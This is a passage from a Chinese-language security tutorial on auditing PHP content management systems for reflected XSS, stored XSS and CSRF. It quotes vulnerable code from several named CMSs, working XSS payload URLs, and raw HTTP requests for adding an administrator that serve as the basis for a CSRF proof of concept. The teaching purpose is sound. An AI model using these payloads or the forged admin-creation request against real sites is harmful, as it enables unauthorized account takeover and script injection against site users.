        ">
        inc_css/dialog/popup.image.css" rel="stylesheet">
    " alt="" border="0" >
程序会先对传递进来的变量进行base64decode，并拼接进``标签内，由于这里使用了strip_tags()函数，所以我们肯定是不能自己闭合后再构建一个新的标签的，但是由于拼接在img标签内，所以我们可以直接在img标签内X。
payload：
    http://phpwcms/image_zoom.php?show=P29uZXJyb3I9ImFsZXJ0KDEpIg==
  * ThinkLC分类信息系统前台反射型XSS 
api/userinfo.php：
    if ( isset( $_GET['jsoncallback'] ) ) {
       echo $_GET['jsoncallback'] . '(' . json_encode( $user ) . ')';
    } else {
       echo 'var user={uid:' . $user['uid'] . ',gid:' . $user['gid'] . ',score:' . $user['score'] . ',cart:' . $user['cart'] . ',money:' . $user['money'] . ',name:"' . $user['name'] . '",email:"' . $user['email'] . '",oauth:"' . $user['oauth'] . '",mobile:"' . $user['mobile'] . '",authmobile:' . $user['authmobile'] . ',token:"' . $user['token'] . '"};';
    }
可以看到这类是jsonp的点，一般这种点的content-type应该为json，但是程序并没有设置，所以默认情况下是text/html的，而未对GET传递进来的变量就输出出来，同样造成了反射型XSS：
payload：
    http://saxuecms/api/userinfo.php?jsoncallback=%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E
  * Catfish最新版前台反射型XSS
    isSsl() ? 8 : 7;
            if(substr($referer,$len,strlen($host)) == $host)
            {
                $this->params = $request->param();
                Hook::add('catfish_ajax',$this->plugins);
                Hook::listen('catfish_ajax',$this->params,$this->ccc);
                if(isset($this->params['return']))
                {
                    echo $this->params['return'];
                }
            }
            else
            {
                $this->redirect(Url::build('/'));
                exit();
            }
        }
    }
漏洞代码：
    $this->params = $request->param();
      if(isset($this->params['return']))
            {
                  echo $this->params['return'];
              }
可以看到直接将用户输入给输出出来了，并未经过任何过滤，然鹅要输出得先满足一个条件：
    if(substr($referer,$len,strlen($host)) == $host)
所以这个漏洞实际上还是有点鸡肋的。只是为了理解反射型XSS产生的位置以及可能产生的原因，所以以此为例。
复现：
#### 存储型XSS
存储型XSS是由于网站将用户输入存储进数据库中，当用户再次浏览某页面时，从数据库中获取之前的输入并输出，如果在输入->数据库这块过程中没有进行实体化编码以及输出->页面的过程中没进行实体化编码，则很容易产生存储型XSS。
例：
鲇鱼CMS留言处存储型XSS：
之前我看到有这个漏洞报告，懒得下之前的版本了，直接拿最新版改改代码复现：
    public function liuyan()
    {
        $rule = [
            'neirong' => 'require',
            'youxiang' => 'email'
        ];
        $msg = [
            'neirong.require' => Lang::get('Message content must be filled out'),
            'youxiang.email' => Lang::get('The e-mail format is incorrect')
        ];
        $data = [
            'neirong' => Request::instance()->post('neirong'),
            'youxiang' => Request::instance()->post('youxiang')
        ];
        $validate = new Validate($rule, $msg);
        if(!$validate->check($data))
        {
            echo $validate->getError();
            exit;
        }
        $data = [
            'full_name' => Request::instance()->post('xingming'),
            'email' => htmlspecialchars(Request::instance()->post('youxiang')),
            'title' => htmlspecialchars(Request::instance()->post('biaoti')),
            'msg' => htmlspecialchars(Request::instance()->post('neirong')),
            'createtime' => date("Y-m-d H:i:s")
        ];
        Db::name('guestbook')->insert($data);
        return 'ok';
    }
这里full_name处的代码是被我改了的，原本加了一个htmlspecialchars的。
在代码中可以看到，程序直接将我们的xss代码写入了数据库并未做实体化，让我们再来看看输出的地方，这里要先重点关注存储进的表`guestbook`。
一般找存储型XSS就是看程序哪个地方将我们输入的数据插入数据库而不做实体化处理，然后再找哪个地方使用了这个表。
在这里我们可以全局搜索guestbook来查找使用了这个表的位置，快速定位输出点：
可以看到有这么几个地方用了guestbook的表，看看漏洞触发位置：
    public function messages()
    {
        $this->checkUser();
        $this->checkPermissions(5);
        $data = Db::name('guestbook')->order('createtime desc')->paginate(10);
        $this->assign('data', $data);
        $this->assign('backstageMenu', 'neirong');
        $this->assign('option', 'messages');
        return $this->view();
    }
可以看到程序将查询出来的结果直接代入模板中了，所以就产生了存储型XSS。
复现：
  * 鲇鱼CMS最新版存储型XSS(收藏处)
    public function shoucang()
        {
            $data = Db::name('user_favorites')->where('uid',Session::get($this->session_prefix.'user_id'))->where('object_id',Request::instance()->post('id'))->field('id')->find();
            if(empty($data))
            {
                $postdata = Db::name('posts')->where('id',Request::instance()->post('id'))->field('id,post_title,post_excerpt')->find();
                $data = [
                    'uid' => Session::get($this->session_prefix.'user_id'),
                    'title' => $postdata['post_title'],
                    'url' => 'index/Index/article/id/'.Request::instance()->post('id'),
                    'description' => $postdata['post_excerpt'],
                    'object_id' => Request::instance()->post('id'),
                    'createtime' => date("Y-m-d H:i:s")
                ];
                Db::name('user_favorites')->insert($data);
            }
            return true;
        }
程序将用户输入post('id')直接insert进数据库而不检查内容，从而导致了存储型XSS。
数据包：
虽然只是个self-xss，但如果结合CSRF，危害就会扩大很多。
复现：
点击个人中心收藏处即可触发：
所以找存储型XSS的办法实际上是：重点关注insert，查找insert表内数据的输出位。
如果有误，希望师傅斧正。
### CSRF
既然要找CSRF，那肯定是要找一些危害比较大的，而不去管一些小的功能点，比如CSRF更改姓别等...
所以如果我们在找这方面的漏洞时，可以首先寻找后台的一些功能点(添加管理员/修改管理员密码)等，CSRF多是由于没有验证token及referer而存在。
而有时候后台CSRF配合上一些后台的漏洞往往能造成一些大的危害，如任意文件上传+上传点处CSRF = Getshell。
这类漏洞很容易找，而且我建议使用黑盒去找，方便些也快一些，让我们来看看一些不存在CSRF的CMS他们的后台添加管理员的数据包是怎样的：
    POST /index.php/admin/Index/addmanageuser.html HTTP/1.1
    Host: nianyu
    Content-Length: 126
    Cache-Control: max-age=0
    Origin: http://nianyu
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: think_var=zh-cn; PHPSESSID=0diflkok1m4s1qi2cl04cbe1b5
    Connection: close
    yonghuming=admin1&pwd=12345678&repeat=12345678&juese=6&checkCode=818391564379848&verification=dfb048d5f2451c08ff35711fec9dc697
可以看到多了checkCode和verification两个参数，这两个参数是用来验证是否为管理员操作的，可以把他们当作token，而由于这两个参数是随机的，所以这里也就不存在CSRF。
我认为如果不检验token，也不检验referer，就相当于存在CSRF。
例：
jtbc最新版后台CSRF添加管理员：
    POST /console/account/manage.php?type=action&action=add HTTP/1.1
    Host: jtbc
    Content-Length: 73
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: jtbc_console[username]=admin; jtbc_console[authentication]=b3d6551693decb76825ab8ee04d3bd85
    Connection: close
    username=admin2&password=admin&cpassword=admin&role=-1&email=123%40qq.com
以上为添加管理员的数据包，可以看到是不存在任何token的，而即使去掉referer也是可以添加成功的，我们使用Burp生成一个CSRF-POC：